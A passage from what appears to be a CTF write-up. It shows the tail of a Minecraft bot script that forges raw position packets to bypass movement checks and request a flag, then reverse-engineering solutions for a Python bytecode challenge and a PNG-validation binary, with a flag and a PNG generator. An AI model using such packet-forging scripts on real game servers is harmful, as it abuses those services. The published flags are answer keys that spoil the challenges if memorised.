</span></span><span class="line"><span class="cl">      <span class="nx">x</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span> <span class="o">&amp;&amp;</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span><span class="p">.</span><span class="nx">startFlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span><span class="p">.</span><span class="nx">startFlying</span><span class="p">();</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[ACTION] Start flying&#39;</span><span class="p">)</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">cur</span> <span class="o">=</span> <span class="nx">start</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">moving</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">stepCount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">interval</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">((</span><span class="nx">a</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">y</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Target:&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">z</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Initial distance:&#39;</span><span class="p">,</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;blocks&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">movementState</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">cur</span><span class="p">,</span> <span class="nx">moving</span><span class="p">,</span> <span class="nx">stepCount</span><span class="p">,</span> <span class="nx">interval</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">moving</span><span class="p">)</span> <span class="k">return</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">next</span> <span class="o">=</span> <span class="nx">stepTowards</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">,</span> <span class="nx">MAX_STEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">stepLen</span> <span class="o">=</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">remainBefore</span> <span class="o">=</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span> <span class="o">=</span> <span class="nx">next</span>
</span></span><span class="line"><span class="cl">      <span class="nx">movementState</span><span class="p">.</span><span class="nx">stepCount</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[MOVE] step </span><span class="si">${</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">stepCount</span><span class="si">}</span><span class="sb"> -&gt; (</span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">) `</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                  <span class="sb">`(step=</span><span class="si">${</span><span class="nx">stepLen</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb"> rem=</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">remainBefore</span> <span class="o">-</span> <span class="nx">stepLen</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">)`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;position&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">,</span> <span class="nx">onGround</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;position_look&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">,</span> <span class="nx">yaw</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">pitch</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">onGround</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[NET] Move send failed:&#39;</span><span class="p">,</span> <span class="nx">e2</span><span class="o">?</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="nx">e2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">next</span><span class="p">.</span><span class="nx">equals</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">movementState</span><span class="p">.</span><span class="nx">moving</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Arrived at target. Requesting flag...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[CHAT] &gt;&gt; !flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="s1">&#39;!flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="mi">500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="nx">interval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WARN] Spawn not seen after 5s; starting anyway...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;timeout&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">debugCount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;packet&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">meta</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">debugCount</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[PKT]&#39;</span><span class="p">,</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">debugCount</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;player_position_and_look&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;position&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;position_look&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;player_position&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hasTeleportId</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">hasTeleportId</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;teleport_confirm&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">teleportId</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[NET] Confirmed teleport id&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[NET] Teleport confirm write failed:&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="o">?</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">teleportReady</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hasXYZ</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">x</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">y</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">z</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">hasXYZ</span> <span class="o">&amp;&amp;</span> <span class="nx">movementState</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SYNC] Cur pos updated from server packet&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;server-position&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">().</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><h2 id="reverse-engineering-">Reverse engineering ‚öôÔ∏è<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-">#</a></h2>
<h3 id="pythonese">Pythonese<a hidden class="anchor" aria-hidden="true" href="#pythonese">#</a></h3>
<p>This challenge gave a raw <strong>Python bytecode dump</strong> and asked us to recover the flag produced at runtime.</p>
<p>At first glance, the file imports a lot of modules (<code>hashlib</code>, <code>base64</code>, <code>marshal</code>, <code>asyncio</code>, etc.) and fills <code>__doc__</code>/<code>__annotations__</code> with random Base64 to create noise. There‚Äôs also an anti-RE check that looks for reverse-engineering modules and debuggers. We ignored those parts and focused on the control flow.</p>
<p>After mapping functions (<code>f0...f16</code>), we saw that the entrypoint (<code>f16</code>) reads an input string <code>i</code>, builds a small &ldquo;VM&rdquo; (via <code>compile</code> + <code>marshal</code>) that exposes a <code>run(...)</code> function, and then <strong>prints the return value of <code>run(...)</code></strong>. The crucial piece is how that <code>run</code> is constructed in <code>f15</code>: it wraps a constant string <code>r</code> built by <code>f13</code>, so the printed flag is entirely determined by <code>f13</code>.</p>
<p>Inside <code>f13</code> we found two integers derived from the input:</p>
<ul>
<li><code>k1 = int(i[:4])</code></li>
<li><code>k2 = int(i[4:6])</code></li>
</ul>
<p>A nested helper (<code>fvdy</code>) then decodes several integer arrays (labeled conceptually as <code>a, b, c, d, e, f, g, h, i</code>) into characters using this per-element transformation:</p>
<pre tabindex="0"><code>ch = chr( (((v &gt;&gt; 1) + k2) ^ (k1 &amp; 0xFF)) &amp; 0xFF )
</code></pre><p>Once each array is decoded, <code>f13</code> assembles the final string <code>r</code> as:</p>
<ol>
<li>the decoded <code>a</code> (used as a <strong>prefix</strong>),</li>
<li>the other parts reordered by a fixed permutation <code>P = (3, 6, 1, 7, 0, 5, 2, 4)</code>, and</li>
<li>a single-character <strong>suffix</strong>.</li>
</ol>
<p>To solve it, we enforced the natural prefix <code>a == &quot;CTF{&quot;</code> and solved the resulting linear congruences (mod 256) across the first few characters of <code>a</code>. This pins down:</p>
<ul>
<li><code>k1 ‚â° 81 (mod 256)</code> (any 4-digit <code>k1</code> that ends up <code>81</code> modulo 256 works, e.g., <code>1105</code>)</li>
<li><code>k2 = 83</code></li>
</ul>
<p>With <code>k1, k2</code> fixed, decoding and assembling <code>a + permuted_rest + suffix</code> yields the full flag string. Any input whose first 6 digits satisfy those constraints makes the program print the flag (e.g., <code>110583...</code> the remaining digits don‚Äôt matter).</p>
<h4 id="flag">Flag<a hidden class="anchor" aria-hidden="true" href="#flag">#</a></h4>
<pre tabindex="0"><code>CTF{2944cec0c0f401a5fa538933a2f6210c279fbfc8548ca8ab912b493d03d2f5bf}
</code></pre><h3 id="pixel-gate">Pixel Gate<a hidden class="anchor" aria-hidden="true" href="#pixel-gate">#</a></h3>
<p>This challenge shipped with a stripped Go binary (<code>challenge</code>) and a helper script <code>gen.py</code>. The binary expects a very specifically crafted PNG file and prints its contents only if all internal validations succeed. By reversing the RISC-V64 Go build we found a deliberately narrow, hand-rolled PNG parser whose constraints are mirrored exactly by the generator script.</p>
<h3 id="ironevil">Ironevil<a hidden class="anchor" aria-hidden="true" href="#ironevil">#</a></h3>
<p>TODO</p>
<h4 id="the-algorithm">The algorithm<a hidden class="anchor" aria-hidden="true" href="#the-algorithm">#</a></h4>
<p>The file must begin with the standard 8-byte PNG signature. Immediately following, an <code>IHDR</code> chunk is required whose 13-byte payload encodes width 1337, height 1, bit depth 8 and color type 2 (truecolor) while compression, filter and interlace bytes are all zero. (The code path tolerated color type 6 as an alternative, yet the provided script sticks to 2, keeping things simpler.) Every chunk undergoes a normal PNG CRC32 verification computed over the concatenation of its 4-byte type and data. After <code>IHDR</code>, the program expects a <code>tEXt</code> chunk whose data splits on the first NUL: a 15‚Äëbyte key followed by a 17‚Äëbyte value. These bytes are compared verbatim against embedded constants: key <code>6ee494848e978ea</code> and value <code>d50bc687e6e14f8f8</code>. A custom ancillary chunk named <code>raRE</code> must also appear, carrying an 18‚Äëbyte payload equal (as raw ASCII, not decoded) to <code>2b6b2c6ba2912d219d</code>. At least one <code>IDAT</code> chunk is required but its contents are never decompressed; an empty data field is accepted because only its presence and CRC are considered. Finally an <code>IEND</code> chunk must terminate the stream. Internally the parser maintains flags for signature validity, successful <code>IHDR</code>, matching text key/value, correct <code>raRE</code> payload, having seen one or more <code>IDAT</code> chunks, and encountering <code>IEND</code>. Only if all become true does the program reopen the file and dump its raw bytes to stdout.</p>
<h4 id="solution-1">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-1">#</a></h4>
<p>Reconstructing a passing file therefore reduces to a linear assembly: emit the PNG signature, construct the exact <code>IHDR</code>, forge the <code>tEXt</code> bytes as key + NUL + value, append the fixed <code>raRE</code> payload, include an empty <code>IDAT</code>, and close with <code>IEND</code>, ensuring each chunk‚Äôs crc32(type||data) matches the stored checksum. The order used by the helper‚ÄîIHDR ‚Üí tEXt ‚Üí raRE ‚Üí IDAT ‚Üí IEND‚Äîsatisfies all dependencies and keeps the image minimal.</p>
<p>The helper <code>gen.py</code> automates these steps and writes <code>pass.png</code>:</p>
<h5 id="python-png-generator">Python PNG generator<a hidden class="anchor" aria-hidden="true" href="#python-png-generator">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">chunk</span><span class="p">(</span><span class="n">typ</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">typb</span> <span class="o">=</span> <span class="n">typ</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">typb</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">typb</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="n">crc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_png</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89</span><span class="s2">PNG</span><span class="se">\r\n\x1a\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ihdr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;IIBBBBB&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">text_key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;6ee494848e978ea&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text_val</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;d50bc687e6e14f8f8&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text_data</span> <span class="o">=</span> <span class="n">text_key</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">text_val</span>
</span></span><span class="line"><span class="cl">    <span class="n">rare_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;2b6b2c6ba2912d219d&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">idat_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>  <span class="c1"># empty accepted</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="n">sig</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;IHDR&#34;</span><span class="p">,</span> <span class="n">ihdr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;tEXt&#34;</span><span class="p">,</span> <span class="n">text_data</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;raRE&#34;</span><span class="p">,</span> <span class="n">rare_data</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;IDAT&#34;</span><span class="p">,</span> <span class="n">idat_data</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;IEND&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">build_png</span><span class="p">()</span>
